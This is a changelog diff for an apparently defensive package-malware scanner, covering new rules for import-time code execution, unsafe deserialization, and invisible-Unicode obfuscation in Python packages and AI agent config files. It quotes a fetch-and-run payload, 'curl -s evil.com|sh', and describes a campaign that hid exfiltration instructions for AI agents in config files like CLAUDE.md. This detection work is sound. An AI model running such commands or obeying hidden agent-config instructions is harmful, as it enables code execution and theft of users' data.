@@ -5,6 +5,88 @@ All notable changes to MUAD'DIB will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [2.11.41] - 2026-05-25
+
+### Added
+
+- New scanner `src/scanner/python-source.js` (19th parallel scanner). Walks `__init__.py`, `setup.py`, top-level `*.py`, and `src/<pkg>/__init__.py` (PEP-518 layout) for import-time / install-time RCE patterns. Closes the TrapDoor (mai 2026) PyPI gap — 0/7 packages of the campaign were detected pre-PYSRC. (PR #480)
+- 8 new rules MUADDIB-PYSRC-001..008:
+  - **PYSRC-001** `import_time_exec` CRITICAL — `exec()` / `eval()` at module level in `__init__.py` / `setup.py`.
+  - **PYSRC-002** `import_time_subprocess` CRITICAL — `subprocess.Popen/run/call/check_output/getoutput`.
+  - **PYSRC-003** `import_time_os_system` CRITICAL — `os.system()` / `os.popen()` / `os.spawn*()` / `os.exec*()`.
+  - **PYSRC-004** `import_time_fetch_exec` CRITICAL (compound) — network fetch (urllib / requests / http.client / httpx / aiohttp) AND `exec`/`eval` in the same file (TrapDoor signature: remote-payload-then-RCE).
+  - **PYSRC-005** `import_time_base64_exec` CRITICAL (compound) — `base64.b64decode()` / `codecs.decode()` AND `exec`/`eval` in the same file.
+  - **PYSRC-006** `import_time_deserialization` CRITICAL — `pickle.loads()` / `marshal.loads()` / `dill.loads()` / `cloudpickle.loads()` / `jsonpickle.loads()` / `shelve.loads()` (RCE via unsafe deserialization).
+  - **PYSRC-007** `dynamic_dangerous_import` HIGH — `__import__('subprocess'|'os'|'requests'|'urllib'|'socket'|'http'|'ssl'|'ctypes'|'importlib')` (obfuscation pattern to evade static `import X` tracking).
+  - **PYSRC-008** `python_source_unicode_obfuscation` CRITICAL — ≥5 invisible Unicode chars in a `.py` file (mirror of AICONF-004 for Python source).
+- Source preprocessing — strips Python full-line comments and triple-quoted strings before regex (reduces FPs on docstrings mentioning `exec` / `subprocess`).
+- Defense in depth — `python-source.js` also imports `stripInvisibleUnicode()` from `src/shared/unicode-invisibles.js` (shared with `ai-config.js`) and applies it before pattern matching.
+- 20 new tests + 12 test fixtures under `tests/samples/python-source/` (8 positive TrapDoor-style inert, 4 negative FP-control). Smoke FP-tested against the 4 most popular legitimate PyPI sdists (click, flask, pytest, requests): 0/4 PYSRC fires. (PR #480)
+
+## [2.11.40] - 2026-05-25
+
+### Added
+
+- New rule MUADDIB-AICONF-004 `aiconf_unicode_obfuscation` CRITICAL — detects ≥5 zero-width / directional / variation-selector codepoints in AI agent config files (`.cursorrules`, `CLAUDE.md`, `.windsurfrules`, `AGENT.md`, `.github/copilot-instructions.md`, `.claude/settings.json`). Closes the TrapDoor (mai 2026) attack vector that hides exfil instructions from human review by interspersing U+200B inside keywords. (PR #479)
+
+### Changed
+
+- `src/scanner/ai-config.js` now normalizes file content via `stripInvisibleUnicode()` before applying pattern regex. A payload like `cu​rl -s evil.com|sh` (ZWSP-split keyword) now matches `SHELL_COMMAND_PATTERNS` after normalization. (PR #479)
+- Refactor — extracted shared helpers `countInvisibleUnicode()` + new `stripInvisibleUnicode()` into `src/shared/unicode-invisibles.js`. `src/scanner/obfuscation.js` updated to import from the shared module (no behavioral change to OBF-003). Codepoint coverage extended: U+200E/F LRM/RLM, U+202A-E directional override, U+2061-4 invisible math operators added to the existing set (ZWSP/ZWNJ/ZWJ, word joiner, BMP & supplementary variation selectors, tag chars). (PR #479)
+
+## [2.11.39] - 2026-05-25
+
+### Fixed
+
+- Monitor — extract `.whl` (Python wheel) tarballs via `adm-zip` instead of falling back to `tar` (which was the wrong format for wheels, producing silent extraction failures). (PR #478)
+- Monitor — daily coverage metric now uses `unique_attempts / publish_events` per ecosystem (npm + pypi) instead of an inconsistent aggregate that mixed both. (PR #478)
+
+## [2.11.38] - 2026-05-25
+
+### Added
+
+- CycloneDX 1.5 SBOM export (`--cyclonedx <path>` CLI flag). Generates a Software Bill of Materials in the CycloneDX 1.5 JSON format covering scanned npm + PyPI dependencies. (PR #477)
+
+### Fixed
+
+- AST-091 self-FP — `ctx.relPath` typo + missing `EXCLUDED_FILES` filter caused the rule to fire on MUAD'DIB's own source files during self-scan. (PR #477)
+
+## [2.11.37] - 2026-05-24
+
+### Added
+
+- Risk-domain taxonomy — 5-domain classification (MAL malware / AUT author / ENG engineering / VUL vulnerability / LIC license) applied to all 232 rules. Output now includes the `domain` field in SARIF, JSON, HTML, and CLI reports for filtering / triage. (PR #476)
+
+## [2.11.36] - 2026-05-24
+
+### Added
+
+- New rule MUADDIB-MAINTAINER-006 — detects npm package maintainers whose email domain shows up as compromised / suspended via RDAP lookup (e.g. domain registered very recently, registrar action). Catches sleeper-domain takeover patterns. (PR #475)
+
+## [2.11.35] - 2026-05-24
+
+### Added
+
+- New rule MUADDIB-MAINTAINER-005 — detects npm package maintainers whose email domain has no valid DNS MX record (unclaimed / expired domain, signal of credential-takeover risk via email recovery). (PR #474)
+
+## [2.11.34] - 2026-05-24
+
+### Changed
+
+- F5 (sensitive-files contextual FP cap feature) — extended credential path coverage to cloud (AWS / Azure / GCP creds), DB (common connection-string locations), and HTTP auth (Authorization headers / token file paths). Reduces false negatives where a credential read into a small set of well-known sensitive paths was not blocking the F5 cap. (PR #473)
+
+## [2.11.33] - 2026-05-24
+
+### Added
+
+- New rule MUADDIB-AST-092 `silent_stealth_process` CRITICAL — detects `child_process` calls combining `detached: true` + `stdio: 'ignore'`. Pattern observed on TrapDoor `build-scripts-utils` / `async-pipeline-builder` (mai 2026) where the child process survives parent exit and produces zero observable output (full stealth). Emitted in addition to AST-012 (Detached Background Process) for the same call site. (PR #472)
+
+## [2.11.32] - 2026-05-24
+
+### Added
+
+- New rule MUADDIB-PKG-022 `release_zero_package` — detects packages publishing `0.x.x` versions with suspicious manifest signatures (intent: ship-as-vulnerable, common pattern in typosquat / release-day attack scenarios). (PR #471)
+
 ## [2.11.31] - 2026-05-24
 
 ### F14 contextual FP cap — HARD vs SOFT exfil split (F9/F10/F11)
